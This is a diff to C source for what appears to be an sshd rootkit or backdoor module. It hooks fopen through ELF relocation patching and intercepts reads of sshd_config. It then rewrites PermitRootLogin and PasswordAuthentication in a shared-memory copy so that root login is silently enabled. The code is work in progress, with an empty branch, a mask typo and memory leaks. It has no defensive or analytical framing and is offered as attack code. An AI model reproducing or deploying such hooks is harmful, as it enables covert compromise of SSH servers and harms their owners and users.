@@ -273,10 +273,23 @@ static int my_pam_auth(struct pam_handle *pamh, int flags)
  *	and then unhook ourselves sneaky beaky like
  * TODO: sanity
  * TODO: read sshd.c -- very possible fopen(sshd_config) is the first ever fopen
- * TODO: modularity - PasswordAuthentication and whatever other config necessary to change
+ * XXX: there is probably an easier way to do what I'm trying to do with bitmasks, but I like the practice and it feels cool
  */
 Elf64_Rela *ref_fopen_Rela;
 FILE *(*ref_fopen)(char*, char*);
+
+
+#define MASK_64 						0x0000000000000000
+
+#define PermitRootLogin_EXPLICIT		0x0000000000000001
+#define PermitRootLogin_APPEND			0x0000000000000010
+#define PermitRootLogin_NOWORK			0x0000000000000011
+#define PermitRootLogin_MASK			0x0000000000000011
+
+#define PasswordAuthentication_EXPLICIT 0x0000000000000100
+#define PasswordAuthentication_APPEND 	0x0000000000001000
+#define PasswordAuthentication_NOWORK 	0x0000000000001100
+#define PasswordAuthentication_MASK	 	0x0000000000001100
 
 FILE *my_fopen(char *filename, char *mode)
 {
@@ -291,61 +304,207 @@ FILE *my_fopen(char *filename, char *mode)
 	/* 
 	 * libkeyutils hates _GNU_SOURCE and I haven't bothered to learn about Makefiles and advanced #define usage
 	 * 	so no strcasestr();
-	 * TODO: use strcasestr()
+	 * TODO TODO TODO: use strcasestr() TODO TODO TODO
 	 */
-	char *PermitRootLogin;
+	char *PermitRootLogin = NULL;
+	char *PasswordAuthentication = NULL;
+
 	bool noset = false;
-		
+	
+	unsigned long long BITMASK = MASK_64;	
+
 	int ret = 42;
 	while (ret != -1) {
 		ret = getline(&str, &n, fp); /* XXX: should hopefully be safe ?? */
+	
 
-		PermitRootLogin = strstr(str, "PermitRootLogin");
+		if (strncmp(str, "PermitRootLogin ", strlen("PermitRootLogin ")) == 0)
+			PermitRootLogin = strstr(str, "PermitRootLogin");
+
 		/* determine if PermitRootLogin is explicity set to (Yes || No) - (case insensitive) */
 		if (PermitRootLogin != NULL) {
 
-			/* test if PermitRootLogin is commented
-			 *	if it is - make sure noset is false (readability mostly) and break to the case
-			 * 	that PermitRootLogin is not set explicitly to No and will need to be appended
-			 */
-			char *testcomment = (char*) PermitRootLogin - 1;
-			if (testcomment[0] == '#') {
-				noset = false;
-				break;
-			}
+			/* clear any previously set PermitRootLogin flags -- it's possible for a sshd_config to have duplicates */
+			BITMASK &= ~ PermitRootLogin_MASK;
 
+			/* we have a valid PermitRootLogin string - not commented 
+			 *		if the string is set to yes then there is NOWORK to be done
+			 *		otherwise we will have to EXPLICITly redefine no
+			 */
 
 			char *setting = strstr(PermitRootLogin, "Yes");	
 			if (setting == NULL)
 				setting = strstr(PermitRootLogin, "yes");	
-			/*
-			 * Yes || yes  -- who cares. get me out of here and reset ref_fopen_Rela
-			 *	otherwise we are going to dupe sshd_config
-			 */
+		
 			if (setting != NULL) {
-				goto done;
+				BITMASK |= PermitRootLogin_NOWORK;
+			} else {
 
+				setting = strstr(PermitRootLogin, "No");	
+				if (setting == NULL)
+					setting = strstr(PermitRootLogin, "no");	
+
+				/* PermitRootLogin [n-N][o] */
+				if (setting != NULL) {
+					BITMASK |= PermitRootLogin_EXPLICIT;
+				}
 			}
+		
+			PermitRootLogin = NULL;
+		}
 
-			setting = strstr(PermitRootLogin, "No");	
-			if (setting == NULL)
-				setting = strstr(PermitRootLogin, "no");	
-			/* PermitRootLogin [n-N][o] */
-			if (setting != NULL) {
-				noset = true;
-				break;
-				/* break to below -- No is explicitly set */
+
+		if (strncmp(str, "PasswordAuthentication ", strlen("PasswordAuthentication ")) == 0) {
+			PasswordAuthentication = strstr(str, "PasswordAuthentication");
+
+			if (PasswordAuthentication != NULL) {
+
+				/* clear any previously set PasswordAuthentication flags -- it's possible for a sshd_config to have duplicates */
+				BITMASK &= ~ PasswordAuthentication_MASK;
+
+				/* we have a valid PasswordAuthentication string - not commented 
+				 *		if the string is set to yes then there is NOWORK to be done
+				 *		otherwise we will have to EXPLICITly redefine no
+				 */
+
+				char *setting = strstr(PasswordAuthentication, "Yes");	
+				if (setting == NULL)
+					setting = strstr(PasswordAuthentication, "yes");	
+			
+				if (setting != NULL) {
+					BITMASK |= PasswordAuthentication_NOWORK;
+				} else {
+
+					setting = strstr(PasswordAuthentication, "No");	
+					if (setting == NULL)
+						setting = strstr(PasswordAuthentication, "no");	
+
+					/* PasswordAuthentication [n-N][o] */
+					if (setting != NULL) {
+						BITMASK |= PasswordAuthentication_EXPLICIT;
+					}
+				}
+			
+				PasswordAuthentication = NULL;
 			}
 		}
 	}
-
+	fclose(fp);
+		
 	signed long int orig_sshd_config_size; /* XXX: checkme: type sanity */
 	struct stat st;	
 	stat(filename, &st);
 	orig_sshd_config_size = st.st_size;
 
-	char *repl = "PermitRootLogin yes\n";
 
+	/* if we never ran into any of the strings we wanted in sshd_config 
+	 *	 -- BITMASK is unset
+	 * then make sure to append these strings to the end of the duped sshd_config we are making
+	 */	
+	unsigned long long tmpmask = BITMASK & PermitRootLogin_MASK;
+		
+	if (tmpmask != PermitRootLogin_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
+		BITMASK |= PermitRootLogin_APPEND;
+
+	
+	tmpmask = BITMASK & PasswordAuthentication_MASK;
+
+	if (tmpmask != PasswordAuthentication_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
+		BITMASK |= PasswordAuthentication_APPEND;
+	
+
+
+	/* do explicit adds first -- leave them in the SHM 
+		-- make sure we keep track of the buffer size for correct concats when appends come later
+	*/
+
+	int buf_len = orig_sshd_config_size + 150; /* what's 150 bytes between friends? */
+	char *buf = malloc(buf_len);
+
+	int orig_fd = open(filename, O_RDONLY);
+
+	read(orig_fd, buf, buf_len);
+	close(orig_fd);
+
+	/* we have original sshd_config in memory - buf */
+
+	/* now change the options that were EXPLICITly set */
+	free(str);
+	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_EXPLICIT) {
+		
+		/* find a valid pointer to PermitRootLogin that isn't a comment
+		 * and doesn't abuse strstr()
+		 *
+		 * FIXME: strtok was obliterating buf, so just memcpy a new buf and use that for strtok instead. -- leaks
+		 */
+
+		char *tok_buf = malloc(buf_len); /* FIXME: this will leak */
+		
+		memcpy(tok_buf, buf, buf_len);
+
+		str = strtok(tok_buf, "\n");
+		while (str != NULL) {
+			if (strncmp(str, "PermitRootLogin ", strlen("PermitRootLogin ")) == 0) {
+				PermitRootLogin = strstr(str, "PermitRootLogin");
+			}
+			str = strtok(NULL, "\n");
+		}
+
+
+		char *PRL_Y = "PermitRootLogin yes\n";
+
+		/* how far is PermitRootLogin from the start of sshd_config */
+		unsigned long long bytes_from_start = (char *) PermitRootLogin - (char *) tok_buf;
+
+		/* copy all of the bytes from sshd_config into new -- up until (excluding) PermitRootLogin */
+		char *new = malloc(orig_sshd_config_size + 1);
+		memcpy(new, buf, bytes_from_start);
+
+		/* ... */
+		strncat(new, PRL_Y, strlen(PRL_Y));
+
+		/* get number of char until \n in "PermitRootLogin no" 
+		 * XXX: this most likely isn't needed anymore as this will always be the above no string (+1)
+		 */
+		int newline = strcspn(PermitRootLogin, "\n");
+		newline += 1; /* +1 - strlen(yes) = 3 . strlen(no) = 2 */
+		
+		
+		/* 
+		 * if this doesn't make you love C, I don't know what would 
+		 *
+		 * copy into new -- make sure we skip the "PermitRootLogin yes" we just added by adding newline
+		 * from buf -- bytes_from_start + strlen() will cut "PermitRootLogin no" from buf so we can append the rest of buf
+		 */	
+		memcpy((char *) new + (unsigned long long) bytes_from_start + newline, 
+					(char*) buf + bytes_from_start + strlen("PermitRootLogin no"),
+					strlen(buf + bytes_from_start));
+
+		
+		free(buf);
+		buf = new;
+	}
+
+	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_EXPLICIT) {
+
+
+
+
+	}
+
+
+
+
+
+
+
+
+
+
+
+	
+	sleep(5);
+	char *repl = "PermitRootLogin yes\n";
 	if (noset == true) {
 		/* "PermitRootLogin No" was explicity set */
 		
@@ -422,23 +581,12 @@ FILE *my_fopen(char *filename, char *mode)
 		fclose(fp);
 
 
-		/* some junk gets tacked on to the end of sshd_configs -- don't know what it is
-		 *
-		 * set pch to the end of the sshd_config in memory, use strchr to find '\n' -- thus giving us the actual end of a valid config option
-		 */
-
-		int i;
-		char *pch = (char *) new + (unsigned long long) orig_sshd_config_size;
-		for (i = 10; i < 0; i--) {
-			pch = strchr(pch, '\n');
-			if (pch != NULL)
-				break;
-			pch = (char *) pch - 1;
-		}
+		/* tack on *repl onto the end of sshd_config */
+		char *end = (char *) new + (unsigned long long) orig_sshd_config_size;
 		
-		memcpy(pch, repl, repl_len);	
+		memcpy(end, repl, repl_len);	
 
-
+		/* new is now set up correctly - just need to work fdopen magic */
 		int fd = shm_open("/7355608", O_RDWR | O_CREAT, 0400);
 		
 		ftruncate(fd, orig_sshd_config_size + repl_len);
